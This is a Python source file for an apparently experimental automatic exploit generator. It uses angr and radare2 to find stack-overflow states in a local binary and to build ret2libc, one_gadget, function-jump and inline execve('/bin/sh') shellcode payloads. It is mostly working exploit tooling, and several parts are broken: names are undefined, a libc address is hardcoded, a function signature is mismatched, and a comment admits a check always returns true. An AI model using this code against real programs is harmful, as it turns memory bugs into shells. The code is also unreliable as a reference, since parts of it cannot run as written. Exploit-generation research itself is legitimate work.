import angr
import sys
import claripy
from termcolor import colored
import logging
#import binascii
import struct
from subprocess import Popen, PIPE, STDOUT
import os
from one_gadget import generate_one_gadget

if not hasattr(sys, "argv"):
    sys.argv = ['']

#from pwn import *

from src.concrete.target import R2ConcreteTarget

class Exploiter():
    payload = b'DEFAULT_STDIN'
    def __init__(self):
        pass

    def test_run(self):
        p = Popen([os.getcwd() + "/" + self.r2angr.binary], stdout=PIPE, stdin=PIPE, stderr=PIPE)
        stdout_data = p.communicate(input=self.payload)[0]
        try:
            print(str(stdout_data.decode()))
        except:
            print(str(stdout_data))

    def test_debug(self):
        with open(".temp.rr2", "w+") as f:
            f.write("#!/usr/bin/rarun2\nprogram=binary\nstdin=.buffer.txt\n")
        with open(".buffer.txt", "wb+") as f:
            f.write(self.payload + "\n".encode())

        self.r2angr.r2p.cmd("e dbg.profile=temp.rr2")
        self.r2angr.r2p.cmd("ood")

    def test2(self):
        project = self.r2angr.angr.Project(self.r2angr.binary)
        print(str(self.payload))
        state = project.factory.entry_state(args=[], stdin=self.payload)
        def print_return(state):
            print("   return")
        state.inspect.b("return", when=angr.BP_AFTER, action=print_return)

        simgr = project.factory.simgr(state)

        self.r2angr.r2p.cmd("aa")

        for func in self.r2angr.r2p.cmdj("aflj"):
            if ".imp." in func["name"]:
                project.hook(func["offset"], self.library_function_hook)
            else:
                project.hook(func["offset"], self.function_hook)

        while len(simgr.active) > 0:
            output = simgr.active[0].posix.dumps(1)
            if len(output) > 3:
                print(output)
            simgr.step()

        print("Done testing")
    
    def explore(self):
        print("Exploring for vulnerable program state")
        #p = angr.Project("basic", load_options={"auto_load_libs": False})
        p = self.r2angr.project
        simgr = self.r2angr.simgr

        p.hook_symbol("printf", hook_printf())
        p.hook_symbol("__isoc99_scanf", hook_scanf())

        for state in simgr.active:
            pass
            #state.inspect.b("mem_write", when=angr.BP_AFTER, action=self.breakpoint_mem_write)

        #stdin = claripy.BVS("stdin", 300*8)
        #state = p.factory.entry_state(stdin=stdin);
        #simgr = p.factory.simgr(state, save_unconstrained=True);

        print("Current number of active states is: " + str(len(simgr.active)))
        while len(simgr.active) > 0:
            #print(str(simgr) + " " + str(simgr.active[0].regs.rip))
            simgr.step()

            if len(simgr.unconstrained) > 0:
                print("Found unconstrained state")

                for s in simgr.unconstrained:
                    if self.fully_symbolic(s, s.regs.pc):
                        print("Reached fully symbolic pc")
                        #break

                    state_copy = s.copy()
                    constraints = []
                    for i in range(int(state_copy.arch.bits/8)):
                        constraints.append(claripy.And(state_copy.regs.pc.get_byte(i) == 0x42))

                    if state_copy.solver.satisfiable(extra_constraints=constraints):
                        print("Can overwrite pc")
                        for constraint in constraints:
                            state_copy.add_constraints(constraint)

                    logging.getLogger("claripy.ast.bv").disabled = True

                    skipped = 0
                    count = 0
                    for byte in self.r2angr.stdin.chop(8):
                        if state_copy.solver.satisfiable(extra_constraints=[byte == "\x41"]):
                            state_copy.add_constraints(byte == "A")
                            print(colored("[", "yellow") + colored("R2ANGR", "green") + colored("] ", "yellow") + colored("Constraining stdin bytes. Constrained: ", "yellow") + str(count) + colored(", Skipped: ", "yellow") + str(skipped), end="\r")
                            count += 1
                        else:
                            skipped += 1
                    
                    print(colored("[", "yellow") + colored("R2ANGR", "green") + colored("] ", "yellow") + colored("Constraining stdin bytes. Constrained: ", "yellow") + str(count) + colored(", Skipped: ", "yellow") + str(skipped))

                    logging.getLogger("claripy.ast.bv").disabled = False

                    stdin_shellcode = state_copy.posix.dumps(0)

                    self.base_shellcode = stdin_shellcode

                    #stdin_shellcode = stdin_shellcode[0:stdin_shellcode.rfind(b'\x42')+1]
                    self.print_shellcode(stdin_shellcode)

                    self.make_payload_auto(s)

                    simgr.unconstrained.remove(s)

                simgr.drop(stash="unconstrained")

    def make_payload_auto(self, state):
        print("Weaponizing shellcode")
        r = self.r2angr.r2p
        
        nx = r.cmdj("ij")["bin"]["nx"]
        pic = r.cmdj("ij")["bin"]["pic"]
        canary = r.cmdj("ij")["bin"]["canary"]

        print("nx: " + str(nx))
        print("pic: " + str(pic))
        print("canary: " + str(canary))

        return self.make_payload_ret2libc(state)
        #return self.make_payload_one_gadget(state)
    
    def make_payload_shellcode(self, state):
        # Check if binary matches list of stored shellcodes
        # If in list, use one of those, otherwise
        payload = self.base_shellcode
        shellcode = "\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"

        max_length = payload.rfind(b'\x42'*8)+12

        for buf_addr in self.find_symbolic_buffer(state, len(shellcode)):
            print("Found symbolic buffer at " + hex(buf_addr))
            memory = state.memory.load(buf_addr, len(shellcode))
            sc_bvv = state.solver.BVV(shellcode)
            
            if state.satisfiable(extra_constraints=(memory == sc_bvv, ep.regs.pc == buf_addr)):
                print("Found buffer for shellcode, finishing exploit")
                state.add_constraints(memory == sc_bvv)
                state.add_constraints(state.regs.pc == buf_addr)
                break

        """
        found = False
        for i in range(0, len(payload)-len(shellcode)-1):
            if payload[i:i+len(shellcode)] == ("\x41"*len(shellcode)).encode():
                found = True

                j = i
                for c in shellcode:
                    payload = payload[:j] + shellcode[j-i].encode() + payload[j+1:]
                    j += 1
                if j > max_length:
                    max_length = j

                break

        if not found:
            print("COULDN'T FIT PAYLOAD")
        """

        payload = payload[:max_length]
        self.payload = payload
        self.print_shellcode(payload)

        return payload

    def make_payload_ret2libc(self, state):
        self.r2angr.r2p.cmd("e search.in = dbg.maps")
        self.r2angr.r2p.cmd("ood")
        self.r2angr.r2p.cmd("dcu entry0")
        system_addr = self.r2angr.r2p.cmdj("dmij libc system")[0]["vaddr"]
        #binsh_addr = int(self.r2angr.r2p.cmd("/ /bin/sh").split("\n")[-1].split(" ")[0], 16)
        binsh_addr = 0xf7f523cf # NEED TO GET THIS VALUE AUTOMATICALLY
        self.r2angr.r2p.cmd("doc")

        print("Found system() at " + hex(system_addr))
        print("Found \"/bin/sh\" at " + hex(binsh_addr))

        shellcode = self.base_shellcode[0:self.base_shellcode.rfind(b'\x42')+1]

        if state.arch.bits == 32:
            print("Constructing 32 bit shellcode")
            shellcode = shellcode[:-4] + struct.pack("<I", system_addr) + "AAAA".encode() + struct.pack("<I", binsh_addr)
        else:
            print("Constructing 64 bit shellcode")
            shellcode = shellcode[:-8] + addr

        self.payload = shellcode
        self.print_shellcode(shellcode)
        return shellcode


    def make_payload_one_gadget(self, state):
        print("Finding one_gadget")
        offsets = []
        for offset in generate_one_gadget("/lib/x86_64-linux-gnu/libc.so.6"):
            offsets.append(offset)
            print(offset)

        shellcode = self.base_shellcode[0:self.base_shellcode.rfind(b'\x42')+1]

        addr = struct.pack("<I", 0x4f3c2)

        if state.arch.bits == 32:
            shellcode = shellcode[:-4] + addr
        else:
            shellcode = shellcode[:-8] + addr

        self.payload = shellcode
        self.print_shellcode(shellcode)
        return shellcode
    
    def make_payload_call(self):
        print("Making call payload")
        shellcode = self.base_shellcode[0:self.base_shellcode.rfind(b'\x42')+1]
        if len(self.r2angr.r2p.cmd("afl").split("\n")) < 5:
            self.r2angr.r2p.cmd("aa")

        functions = self.r2angr.r2p.cmd("afl").split("\n")

        print("Functions:")
        for line in functions:
            print("   " + line)

        print("")
        print("Enter address to jump to:")
        print(" >> ", end="")

        addr = struct.pack("<I", int(input(), 16))

        shellcode = shellcode[:-8] + addr
        self.payload = shellcode
        self.print_shellcode(shellcode)
        return shellcode
    
    def find_symbolic_buffer(self, state, length):
        print("Getting symbolic buffers")

        stdin = state.posix.stdin
        sym_addrs = []

        sym_addrs.extend(state.memory.addrs_for_name("stdin"))
        print(str(sym_addrs))
        print(str(list(state.memory.addrs_for_name("stdin"))))

        print(str(dir(state.posix)))
        print(str(dir(state.posix.dumps(0))))
        print(str(dir(state.posix.stdin)))
        print(str(dir(state.posix.stdin.mem)))
        print(str(dir(state.posix.stdin.memo)))
        print(str(list(state.posix.stdin.mem.addrs_for_name("stdin"))))
        print(str(state.posix.stdin.mem._symbolic_addrs))
        #for var in state.posix.dumps
        #    print(str(var))

        for addr in sym_addrs:
            if self.check_continuity(addr, sym_addrs, length):
                yield addr

    def check_continuity(self, variable):
        for i in range(state.arch.bits):
            if not state.solver.symbolic(variable[i]):
                return True # THINKS IT'S ALWAYS CONTINUOUS, CHANGE THIS!!!!
        return True

    def fully_symbolic(self, state, variable):
        for i in range(state.arch.bits):
            if not state.solver.symbolic(variable[i]):
                print("Found non-symbolic bit")
                return False
        return True

    def print_shellcode(self, shellcode):
        shellcode_str = ""
        for byte in shellcode:
            shellcode_str += "\\x" + hex(byte)[2:].zfill(2)

        final = ""
        for byte in shellcode_str.split("\\x"):
            if not byte == "":
                temp = "\\x" + byte
                if "41" in byte:
                    temp = colored(temp, "blue")
                if "42" in byte:
                    temp = colored(temp, "red")

                final += temp

        print(final)

    def function_hook(self, state):
        name = "function"
        for func in self.r2angr.r2p.cmdj("aflj"):
            if func["offset"] == state.addr:
                name = func["signature"]
        print(colored("Called " + name, "green"))

    def library_function_hook(self, state):
        name = "function"
        for func in self.r2angr.r2p.cmdj("aflj"):
            if func["offset"] == state.addr:
                name = func["signature"]
        print(colored("Called " + name, "green"))

    
    def breakpoint_mem_write(self, state):
        print("Writing " + str(state.inspect.mem_write_expr) + " to location " + str(state.inspect.mem_write_address))

    def print_explore(self):
        self.print_debug(colored("Found " + str(len(self.r2angr.simgr.found)) + " solutions", "green"))
    
    def print_debug(self, s):
        print(colored("[", "yellow") + colored("DEBUG", "blue") + colored("] ", "yellow") + colored(s, "yellow"))

class hook_printf(angr.procedures.libc.printf.printf):
    def run(self):
        print("Hooked printf at " + hex(self.addr))

        return super(type(self), self).run()

class hook_scanf(angr.procedures.libc.scanf.scanf):
    def run(self, fmt):
        print("Hooked scanf at " + hex(self.addr) + " with format string " + str(fmt))
        return super(type(self), self).run(fmt)

